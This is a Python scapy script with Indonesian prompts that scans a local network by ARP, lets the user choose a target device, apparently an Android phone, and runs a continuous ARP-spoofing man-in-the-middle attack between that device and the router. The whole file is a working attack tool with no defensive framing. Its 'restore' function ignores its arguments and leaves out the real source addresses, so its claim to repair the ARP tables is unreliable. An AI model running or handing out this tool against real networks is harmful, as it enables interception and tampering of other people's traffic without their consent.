from scapy.all import ARP, Ether, srp, conf
from scapy.all import *
import re, os, sys

conf.iface = "Wi-Fi"

gateway = input('Masukan Gatweway LAN (ex:192.168.1.1/24):')
new_ip = re.sub(r'^(\d+\.\d+\.\d+)\.\d+(/24)$', r'\1.0\2', gateway)

print('[*]Menscan IP Address...')
eth = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=new_ip)
result = srp(eth, timeout=2, verbose=0)[0]
res = []

print('[+]Menyiapkan IP Address')

for sent, received in result:
    res.append(f"{received.psrc} {received.hwsrc}")

if len(res) == 0:
    print('[!]IP Address tidak ditemukan. coba periksa IP Gateway')
    sys.exit()
else:
    pass

os.system('clear')

print('IP Address    MAC Address')
for o in res:
    print(o)

target_ip = input('Pilih Target IP:') # IP Android
gateway_ip = re.sub(r'/\d+$', '', gateway) # IP Router

# Dapatkan MAC Address
def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, retry=2, verbose=0)
    for s, r in ans:
        return r[Ether].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, verbose=0)
    print(f"[+] Sent spoofed ARP to {target_ip} (pretending to be {spoof_ip})")

def restore(dest_ip, src_ip, dest_mac, src_mac):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac)
    send(pkt, count=4, verbose=0)

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

if not target_mac or not gateway_mac:
    print("[!] Gagal mendapatkan MAC address.")
    exit()

print("[*] Menjalankan ARP spoofing... Tekan Ctrl+C untuk berhenti.")

try:
    while True:
        spoof(target_ip, gateway_ip, target_mac)   # Android: Router = PC
        spoof(gateway_ip, target_ip, gateway_mac)   # Router: Android = PC
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Mengembalikan ARP table...")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    print("[+] Selesai.")
